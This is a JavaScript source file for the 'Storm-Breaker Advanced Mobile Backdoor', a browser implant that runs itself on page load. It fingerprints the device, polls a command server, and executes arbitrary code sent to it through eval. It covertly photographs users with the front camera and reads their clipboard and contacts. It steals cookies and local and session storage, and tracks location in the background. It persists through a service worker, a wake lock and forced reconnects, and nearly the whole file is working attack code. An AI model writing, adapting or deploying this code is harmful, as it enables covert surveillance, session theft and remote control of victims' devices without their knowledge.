/**
 * Storm-Breaker Advanced Mobile Backdoor
 * Enhanced with background persistence, auto-reconnect, and continuous tracking
 */

class MobileBackdoor {
    constructor(serverUrl) {
        this.serverUrl = serverUrl;
        this.uid = this.generateUID();
        this.isRunning = false;
        this.pollInterval = 3000; // 3 seconds
        this.deviceInfo = {};
        this.trackingInterval = null;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 999999; // Infinite reconnects

        this.init();
    }

    generateUID() {
        const stored = localStorage.getItem('mobile_backdoor_uid');
        if (stored) return stored;

        const uid = 'mobile-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now();
        localStorage.setItem('mobile_backdoor_uid', uid);
        return uid;
    }

    async init() {
        console.log('[Mobile Backdoor] Initializing...');
        await this.collectDeviceInfo();
        await this.register();
        this.startPolling();
        this.setupPersistence();
        this.startBackgroundTracking();
        this.setupAutoReconnect();
    }

    async collectDeviceInfo() {
        this.deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            cores: navigator.hardwareConcurrency || 'Unknown',
            memory: navigator.deviceMemory || 'Unknown',
            connection: this.getConnectionInfo(),
            battery: await this.getBatteryInfo(),
            permissions: await this.checkPermissions()
        };
    }

    getConnectionInfo() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!conn) return 'Unknown';

        return {
            type: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt,
            saveData: conn.saveData
        };
    }

    async getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
        } catch (e) {
            return 'Not available';
        }
    }

    async checkPermissions() {
        const perms = {};
        const permissionsToCheck = ['camera', 'microphone', 'geolocation', 'notifications'];

        for (const perm of permissionsToCheck) {
            try {
                if (navigator.permissions) {
                    const result = await navigator.permissions.query({ name: perm });
                    perms[perm] = result.state;
                }
            } catch (e) {
                perms[perm] = 'unknown';
            }
        }

        return perms;
    }

    async register() {
        try {
            const response = await fetch(`${this.serverUrl}/api/mobile/register`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    uid: this.uid,
                    info: this.deviceInfo
                })
            });

            if (response.ok) {
                console.log('[Mobile Backdoor] Registered successfully');
                this.reconnectAttempts = 0; // Reset on successful connection
            }
        } catch (e) {
            console.error('[Mobile Backdoor] Registration failed:', e);
            this.handleConnectionError();
        }
    }

    startPolling() {
        if (this.isRunning) return;
        this.isRunning = true;

        this.pollLoop();
    }

    async pollLoop() {
        while (this.isRunning) {
            try {
                const response = await fetch(`${this.serverUrl}/api/mobile/poll`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ uid: this.uid })
                });

                if (response.ok) {
                    const data = await response.json();
                    if (data.command) {
                        await this.executeCommand(data.command);
                    }
                    this.reconnectAttempts = 0; // Reset on successful poll
                } else {
                    this.handleConnectionError();
                }
            } catch (e) {
                console.error('[Mobile Backdoor] Poll failed:', e);
                this.handleConnectionError();
            }

            await this.sleep(this.pollInterval);
        }
    }

    handleConnectionError() {
        this.reconnectAttempts++;
        if (this.reconnectAttempts < this.maxReconnectAttempts) {
            const delay = Math.min(30000, 1000 * Math.pow(2, this.reconnectAttempts)); // Exponential backoff, max 30s
            console.log(`[Mobile Backdoor] Reconnecting in ${delay / 1000}s... (Attempt ${this.reconnectAttempts})`);
            setTimeout(() => this.register(), delay);
        }
    }

    async executeCommand(cmd) {
        console.log('[Mobile Backdoor] Executing:', cmd);

        try {
            if (cmd === 'get_location') {
                await this.getLocation();
            } else if (cmd === 'capture_camera') {
                await this.captureCamera();
            } else if (cmd === 'get_battery') {
                await this.sendBatteryInfo();
            } else if (cmd === 'get_device_info') {
                await this.sendDeviceInfo();
            } else if (cmd === 'get_clipboard') {
                await this.getClipboard();
            } else if (cmd === 'vibrate') {
                this.vibrate();
            } else if (cmd === 'get_storage') {
                await this.getStorageInfo();
            } else if (cmd === 'get_contacts') {
                await this.getContacts();
            } else if (cmd === 'start_tracking') {
                await this.startContinuousTracking();
            } else if (cmd === 'stop_tracking') {
                this.stopContinuousTracking();
            } else if (cmd === 'get_all_data') {
                await this.extractAllData();
            } else if (cmd.startsWith('eval:')) {
                await this.evalCode(cmd.substring(5));
            } else {
                await this.sendResponse('Unknown command: ' + cmd);
            }
        } catch (e) {
            await this.sendResponse('Error: ' + e.message);
        }
    }

    async getLocation() {
        if (!navigator.geolocation) {
            await this.sendResponse('Geolocation not supported');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const loc = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: new Date(position.timestamp).toISOString(),
                    googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                };

                await this.sendResponse(JSON.stringify(loc, null, 2));
            },
            async (error) => {
                await this.sendResponse('Location error: ' + error.message);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }

    async captureCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' }
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.style.display = 'none';
            document.body.appendChild(video);

            await video.play();
            await this.sleep(1000);

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg', 0.8);

            stream.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);

            await fetch(`${this.serverUrl}/api/mobile/camera`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    uid: this.uid,
                    image: imageData
                })
            });

            await this.sendResponse('Camera capture successful');
        } catch (e) {
            await this.sendResponse('Camera error: ' + e.message);
        }
    }

    async sendBatteryInfo() {
        const battery = await this.getBatteryInfo();
        await this.sendResponse(JSON.stringify(battery, null, 2));
    }

    async sendDeviceInfo() {
        await this.collectDeviceInfo();
        await this.sendResponse(JSON.stringify(this.deviceInfo, null, 2));
    }

    async getClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                await this.sendResponse('Clipboard: ' + text);
            } else {
                await this.sendResponse('Clipboard API not available');
            }
        } catch (e) {
            await this.sendResponse('Clipboard error: ' + e.message);
        }
    }

    vibrate() {
        if ('vibrate' in navigator) {
            navigator.vibrate([200, 100, 200]);
            this.sendResponse('Vibration triggered');
        } else {
            this.sendResponse('Vibration not supported');
        }
    }

    async getStorageInfo() {
        try {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                const estimate = await navigator.storage.estimate();
                const info = {
                    quota: this.formatBytes(estimate.quota),
                    usage: this.formatBytes(estimate.usage),
                    percentUsed: Math.round((estimate.usage / estimate.quota) * 100) + '%'
                };
                await this.sendResponse(JSON.stringify(info, null, 2));
            } else {
                await this.sendResponse('Storage API not available');
            }
        } catch (e) {
            await this.sendResponse('Storage error: ' + e.message);
        }
    }

    async getContacts() {
        try {
            if ('contacts' in navigator && 'ContactsManager' in window) {
                const props = ['name', 'email', 'tel'];
                const opts = { multiple: true };
                const contacts = await navigator.contacts.select(props, opts);
                await this.sendResponse(JSON.stringify(contacts, null, 2));
            } else {
                await this.sendResponse('Contacts API not available (requires user interaction)');
            }
        } catch (e) {
            await this.sendResponse('Contacts error: ' + e.message);
        }
    }

    async evalCode(code) {
        try {
            let result = eval(code);

            if (result && typeof result.then === 'function') {
                result = await result;
            }

            let output;
            if (typeof result === 'object') {
                output = JSON.stringify(result, null, 2);
            } else {
                output = String(result);
            }

            await this.sendResponse('Result: ' + output);
        } catch (e) {
            await this.sendResponse('Eval error: ' + e.message);
        }
    }

    // NEW: Extract all data at once
    async extractAllData() {
        const allData = {
            cookies: document.cookie,
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
            url: window.location.href,
            referrer: document.referrer,
            title: document.title,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            onLine: navigator.onLine,
            battery: await this.getBatteryInfo(),
            connection: this.getConnectionInfo()
        };

        await this.sendResponse('All Data: ' + JSON.stringify(allData, null, 2));
    }

    // NEW: Background tracking
    startBackgroundTracking() {
        // Track location every 5 minutes
        setInterval(() => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const loc = {
                            type: 'background_location',
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            timestamp: new Date().toISOString()
                        };
                        await this.sendBackgroundData(loc);
                    },
                    () => { },
                    { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
                );
            }
        }, 300000); // 5 minutes

        // Track battery every 10 minutes
        setInterval(async () => {
            const battery = await this.getBatteryInfo();
            await this.sendBackgroundData({
                type: 'background_battery',
                battery: battery,
                timestamp: new Date().toISOString()
            });
        }, 600000); // 10 minutes
    }

    async startContinuousTracking() {
        if (this.trackingInterval) {
            await this.sendResponse('Tracking already active');
            return;
        }

        this.trackingInterval = setInterval(async () => {
            const data = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                title: document.title,
                battery: await this.getBatteryInfo(),
                onLine: navigator.onLine
            };
            await this.sendBackgroundData({ type: 'continuous_tracking', data });
        }, 60000); // Every minute

        await this.sendResponse('Continuous tracking started');
    }

    stopContinuousTracking() {
        if (this.trackingInterval) {
            clearInterval(this.trackingInterval);
            this.trackingInterval = null;
            this.sendResponse('Continuous tracking stopped');
        } else {
            this.sendResponse('No tracking active');
        }
    }

    async sendBackgroundData(data) {
        try {
            await fetch(`${this.serverUrl}/api/mobile/background_data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    uid: this.uid,
                    data: data
                })
            });
        } catch (e) {
            console.error('[Mobile Backdoor] Failed to send background data:', e);
        }
    }

    async sendResponse(output) {
        try {
            await fetch(`${this.serverUrl}/api/mobile/response`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    uid: this.uid,
                    output: output
                })
            });
        } catch (e) {
            console.error('[Mobile Backdoor] Failed to send response:', e);
        }
    }

    setupPersistence() {
        localStorage.setItem('mobile_backdoor_active', 'true');
        localStorage.setItem('mobile_backdoor_server', this.serverUrl);

        if ('serviceWorker' in navigator) {
            this.registerServiceWorker();
        }

        if ('wakeLock' in navigator) {
            this.requestWakeLock();
        }

        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });

        document.addEventListener('visibilitychange', () => {
            if (!this.isRunning) {
                this.startPolling();
            }
        });

        // Auto-restart on page load
        window.addEventListener('load', () => {
            if (!this.isRunning) {
                this.init();
            }
        });
    }

    setupAutoReconnect() {
        // Check connection every 30 seconds
        setInterval(async () => {
            if (!this.isRunning) {
                console.log('[Mobile Backdoor] Auto-reconnecting...');
                await this.init();
            }
        }, 30000);

        // Reconnect on online event
        window.addEventListener('online', async () => {
            console.log('[Mobile Backdoor] Network restored, reconnecting...');
            await this.register();
            if (!this.isRunning) {
                this.startPolling();
            }
        });
    }

    async registerServiceWorker() {
        try {
            const registration = await navigator.serviceWorker.register('/mobile-sw.js');
            console.log('[Mobile Backdoor] Service Worker registered');
        } catch (e) {
            console.error('[Mobile Backdoor] Service Worker registration failed:', e);
        }
    }

    async requestWakeLock() {
        try {
            const wakeLock = await navigator.wakeLock.request('screen');
            console.log('[Mobile Backdoor] Wake Lock acquired');

            // Re-acquire wake lock when visibility changes
            document.addEventListener('visibilitychange', async () => {
                if (document.visibilityState === 'visible') {
                    try {
                        await navigator.wakeLock.request('screen');
                    } catch (e) { }
                }
            });
        } catch (e) {
            console.error('[Mobile Backdoor] Wake Lock failed:', e);
        }
    }

    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Auto-start on page load
(function () {
    const serverUrl = window.location.origin;

    // Check if already running
    if (window.mobileBackdoor && window.mobileBackdoor.isRunning) {
        console.log('[Mobile Backdoor] Already running');
        return;
    }

    // Start backdoor
    window.mobileBackdoor = new MobileBackdoor(serverUrl);

    // Make it persistent across page reloads
    console.log('[Mobile Backdoor] Initialized and running');
})();
